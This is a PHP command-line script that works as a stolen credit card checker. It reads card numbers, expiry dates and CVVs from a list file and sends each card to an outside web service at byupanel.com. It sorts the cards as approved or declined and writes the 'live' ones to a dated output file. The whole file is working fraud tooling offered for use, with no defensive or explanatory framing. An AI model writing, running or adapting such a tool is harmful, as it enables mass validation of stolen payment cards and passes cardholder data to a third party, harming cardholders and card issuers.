<?php

require("function.php");

error_reporting(E_ALL); ini_set('display_errors', 1);
date_default_timezone_set("America/Los_Angeles"); clear();
reTry:
echo "
 [>] Card List with `|` or `:` or `/` as delimiters (list.txt):
 [?] ";
$list = trim(fgets(STDIN));

/* Check if file exist */
if (!file_exists($list))
{
    echo " 
 [!] File `".$list."` not found on your Directory
 [!] Press any key to continue...";
    fgets(STDIN);
    goto reTry;
}

/* Counting total of array */
clear();
$data = explode("\r\n", file_get_contents($list));
$total = count($data);
if($total == 1)
{
    $data = explode("\n", file_get_contents($list));
    $total = count($data);
}
echo "
 [@] Console start...
 [>] Total: $total List
";
$time_start = microtime(true);
$approved = 0; $declined = 0; $error = 0;

/* Executing program */
$i = 1;
foreach($data as $value)
{
    ulang:
    list($ccn, $ccxpm, $ccxpy, $cvv) = explode("|", $value);
    $bin = substr($ccn, 0, 6);
    $ccxpm = strlen($ccxpm) == 2 ? $ccxpm : "0".$ccxpm;
    $ccxpy = strlen($ccxpy) == 4 ? substr($ccxpy, 2) : $ccxpy;
    echo " [$i/$total] $ccn|$ccxpm|$ccxpy|$cvv => ";

    if(strtotime(substr(date('Y'), 0, 2)."{$ccxpy}-{$ccxpm}") < strtotime(date("Y-m")))
    {
        print(coloredStr("Card is expired\n", "yellow"));
        goto next;
    }
	
	gettingSession:
    if(file_exists("cookies")) unlink("cookies");

    sleep(5);
	
	$headersCHKCCNUM = ['Referer: https://google.com', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'];
    $webCHKCCNUM = cURL("https://s1.byupanel.com/trial/server2?list=$ccn|$ccxpm|$ccxpy|$cvv", false, $headersCHKCCNUM, false, "cookies");

    if(strpos($webCHKCCNUM, '"error":"2"'))
    {
        $result = coloredStr('Declined', 'red');
		$declined++;
    } elseif(strpos($webCHKCCNUM, '"error":"0"'))
    {
        $chkBin = chkBin($bin);
        $result = coloredStr("Approved => ", "green");
        $result .= coloredStr($chkBin, "cyan");
		@file_put_contents("Live-".date("F j, Y").".txt", "$value\n", FILE_APPEND);
		$approved++;
    } elseif(strpos($webCHKCCNUM, '"error":"3"'))
    {
        $result = coloredStr('Error', 'yellow');
		$error++;
    } elseif(strpos($webCHKCCNUM, '504 Gateway Time-out'))
    {
        print(coloredStr("Timeout ", "yellow"));
        goto gettingSession;
    } else {
        $result = $webCHKCCNUM;
    }
	
    done:
    print("$result\n");
    unlink("cookies");
    next:
    $i++;
}

/* Showing time execution and result */
beep();
$time_end = microtime(true);
$execution_time = substr(($time_end - $time_start) / 60, 0, 7);
echo "
 [>] Total Execution Time: $execution_time minute
 [>] " . colored_string("Approved", "green") . ": $approved - " . colored_string("Declined", "red") . ": $declined - " . colored_string("Error", "yellow") . ": $error
 [*] File saved on each date
 [!] All checking done, Hit enter to exit...";
fgets(STDIN);
clear();